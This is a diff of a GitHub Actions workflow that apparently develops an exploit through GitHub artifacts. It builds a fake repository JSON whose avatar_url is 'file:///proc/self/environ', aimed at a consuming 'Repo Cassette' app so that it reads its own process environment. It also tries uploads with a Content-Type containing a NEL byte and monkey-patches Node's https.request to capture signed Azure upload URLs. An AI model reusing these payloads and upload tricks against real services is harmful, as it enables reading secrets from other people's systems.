@@ -1,4 +1,4 @@
-name: Artifact CT Test
+name: Artifact CT Test v2
 on:
   workflow_dispatch:
 
@@ -8,130 +8,116 @@ jobs:
     steps:
       - name: Create payload
         run: |
-          # JSON payload matching what Node.js JSON.stringify produces
           python3 -c "
           import json
-          payload = json.dumps({
-            'full_name': 'RWeng77/rc-test/actions/artifacts/PLACEHOLDER/zip',
-            'owner': {'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'},
-            'description': 'Repo Cassette postcard',
-            'stargazers_count': 42
-          }, separators=(',', ':'))
-          with open('payload.json', 'w') as f:
-            f.write(payload)
-          print('SHA256:', __import__('hashlib').sha256(payload.encode()).hexdigest())
-          print('Size:', len(payload))
-          print('Content:', payload[:200])
-          "
-
-      - name: Upload standard artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: test-standard
-          path: payload.json
-          retention-days: 1
-
-      - name: Get artifact ID and test download
-        env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          sleep 3
-          echo "=== List artifacts ==="
-          ARTIFACTS=$(curl -s -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
-          echo "$ARTIFACTS" | jq '.artifacts[] | {id, name, size_in_bytes, archive_download_url}'
-          
-          ARTIFACT_ID=$(echo "$ARTIFACTS" | jq -r '.artifacts[0].id')
-          echo "ARTIFACT_ID=$ARTIFACT_ID"
-          
-          echo ""
-          echo "=== Download - check redirect URL ==="
-          curl -sD- -o /dev/null \
-            -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$ARTIFACT_ID/zip" 2>&1 | head -20
-          
-          echo ""
-          echo "=== Follow redirect - check final headers ==="
-          REDIRECT_URL=$(curl -s -o /dev/null -w "%{redirect_url}" \
-            -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$ARTIFACT_ID/zip")
-          echo "Redirect URL (trimmed): ${REDIRECT_URL:0:200}"
-          echo "Has rsct: $(echo $REDIRECT_URL | grep -o 'rsct=[^&]*' || echo 'NO RSCT')"
-          
-          echo ""
-          echo "=== Final response headers ==="
-          curl -sI "$REDIRECT_URL" | head -20
-
-      - name: Try direct Azure upload with custom CT
-        run: |
-          echo "=== Testing direct artifact upload with custom CT ==="
-          
-          # Get the backend URLs
-          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
-          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
-          
-          # Create artifact via v4 API
-          CREATE_RESP=$(curl -s -X POST \
-            "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
-            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "{\"workflow_run_backend_id\":\"$(echo $ACTIONS_RUNTIME_URL | grep -oP '[^/]+$')\",\"workflow_job_run_backend_id\":\"$GITHUB_JOB\",\"name\":\"test-custom-ct\",\"version\":4}")
-          echo "Create response: $CREATE_RESP"
-          
-          UPLOAD_URL=$(echo "$CREATE_RESP" | jq -r '.signed_upload_url // empty')
-          if [ -n "$UPLOAD_URL" ]; then
-            echo "Got upload URL (trimmed): ${UPLOAD_URL:0:150}..."
-            
-            # Upload with custom Content-Type containing NEL byte
-            python3 -c "
-          import json, urllib.request
           payload = json.dumps({
             'full_name': 'RWeng77/rc-test',
             'owner': {'login': 'cassette', 'avatar_url': 'file:///proc/self/environ'},
             'description': 'Repo Cassette postcard',
             'stargazers_count': 42
           }, separators=(',', ':'))
-          
-          # Upload with CT containing NEL
-          ct = 'application/json…'
-          req = urllib.request.Request('$UPLOAD_URL', data=payload.encode(), method='PUT')
-          req.add_header('Content-Type', ct)
-          req.add_header('x-ms-blob-type', 'BlockBlob')
-          try:
-            resp = urllib.request.urlopen(req)
-            print('Upload status:', resp.status)
-            print('Upload headers:', dict(resp.headers))
-          except Exception as e:
-            print('Upload error:', e)
-            if hasattr(e, 'read'):
-              print('Body:', e.read()[:500])
+          with open('payload.json', 'w') as f:
+            f.write(payload)
+          print('Payload:', payload[:200])
+          print('SHA256:', __import__('hashlib').sha256(payload.encode()).hexdigest())
           "
-            
-            # Finalize
-            FINALIZE_RESP=$(curl -s -X POST \
-              "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
-              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-              -H "Content-Type: application/json" \
-              -d "{\"workflow_run_backend_id\":\"$(echo $ACTIONS_RUNTIME_URL | grep -oP '[^/]+$')\",\"workflow_job_run_backend_id\":\"$GITHUB_JOB\",\"name\":\"test-custom-ct\",\"size\":\"$(wc -c < payload.json)\"}")
-            echo "Finalize response: $FINALIZE_RESP"
-            
-            sleep 3
-            
-            # Now check download of custom artifact
-            ARTIFACTS2=$(curl -s -H "Authorization: token $GH_TOKEN" \
-              "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
-            echo "All artifacts: $(echo $ARTIFACTS2 | jq '.artifacts[] | {id, name}')"
-            
-            CUSTOM_ID=$(echo $ARTIFACTS2 | jq -r '.artifacts[] | select(.name=="test-custom-ct") | .id')
-            if [ -n "$CUSTOM_ID" ]; then
-              echo "Custom artifact ID: $CUSTOM_ID"
-              REDIRECT2=$(curl -s -o /dev/null -w "%{redirect_url}" \
+      
+      - name: Show all ACTIONS env vars
+        run: env | grep -i "ACTIONS_\|GITHUB_" | sort | sed 's/=.*/=***/'
+
+      - name: Upload non-zipped artifact (v4 with compression none)
+        uses: actions/upload-artifact@v4
+        with:
+          name: test-nozip
+          path: payload.json
+          compression-level: 0
+          retention-days: 1
+
+      - name: Install @actions/artifact and upload directly
+        run: |
+          npm init -y > /dev/null
+          npm install @actions/artifact@latest 2>&1 | tail -3
+          
+          node -e "
+          const artifact = require('@actions/artifact');
+          const client = new artifact.DefaultArtifactClient();
+          
+          (async () => {
+            try {
+              // Upload with the standard client
+              const result = await client.uploadArtifact(
+                'test-direct',
+                ['payload.json'],
+                '.',
+                { retentionDays: 1, compressionLevel: 0 }
+              );
+              console.log('Upload result:', JSON.stringify(result));
+            } catch(e) {
+              console.error('Error:', e.message);
+            }
+          })();
+          " 2>&1
+
+      - name: Check all artifact downloads
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          sleep 5
+          echo "=== All artifacts ==="
+          ARTIFACTS=$(curl -s -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
+          echo "$ARTIFACTS" | jq '.artifacts[] | {id, name, size_in_bytes}'
+          
+          for NAME in test-nozip test-direct; do
+            AID=$(echo "$ARTIFACTS" | jq -r ".artifacts[] | select(.name==\"$NAME\") | .id")
+            if [ -n "$AID" ] && [ "$AID" != "null" ]; then
+              echo ""
+              echo "=== $NAME (ID=$AID) ==="
+              REDIR=$(curl -s -o /dev/null -D- \
                 -H "Authorization: token $GH_TOKEN" \
-                "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$CUSTOM_ID/zip")
-              echo "Custom redirect rsct: $(echo $REDIRECT2 | grep -o 'rsct=[^&]*' || echo 'NO RSCT')"
-              echo "Custom final headers:"
-              curl -sI "$REDIRECT2" | grep -i content-type
+                "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$AID/zip")
+              LOC=$(echo "$REDIR" | grep -i "^location:" | tr -d '')
+              echo "rsct: $(echo "$LOC" | grep -oP 'rsct=[^&]*' || echo 'NONE')"
+              
+              # Follow redirect and check final CT
+              FINAL_URL=$(echo "$LOC" | sed 's/location: //i')
+              echo "Final CT: $(curl -sI "$FINAL_URL" | grep -i '^content-type')"
+              
+              # Also download and check what's inside
+              curl -s -o "/tmp/$NAME.bin" "$FINAL_URL"
+              echo "Downloaded size: $(wc -c < /tmp/$NAME.bin)"
+              echo "First 4 bytes hex: $(xxd -l4 -p /tmp/$NAME.bin)"
+              file "/tmp/$NAME.bin"
             fi
-          else
-            echo "No upload URL - try alternate API"
-          fi
+          done
+
+      - name: Try direct blob upload with custom CT
+        run: |
+          # Try to find the Azure upload URL by looking at artifact internals
+          node -e "
+          const http = require('http');
+          const https = require('https');
+          const artifact = require('@actions/artifact');
+          
+          // Monkey-patch https.request to intercept Azure uploads
+          const origRequest = https.request;
+          https.request = function(...args) {
+            const url = typeof args[0] === 'string' ? args[0] : args[0].href || args[0].hostname;
+            if (String(url).includes('blob.core.windows.net')) {
+              console.log('INTERCEPTED Azure URL:', String(url).substring(0, 200));
+              const opts = typeof args[0] === 'object' ? args[0] : {};
+              console.log('Method:', opts.method);
+              console.log('Headers:', JSON.stringify(opts.headers || {}));
+            }
+            return origRequest.apply(this, args);
+          };
+          
+          const client = new artifact.DefaultArtifactClient();
+          (async () => {
+            try {
+              await client.uploadArtifact('test-intercept', ['payload.json'], '.', {retentionDays: 1});
+            } catch(e) {
+              console.log('Expected error or completed:', e.message?.substring(0, 200));
+            }
+          })();
+          " 2>&1 | head -30
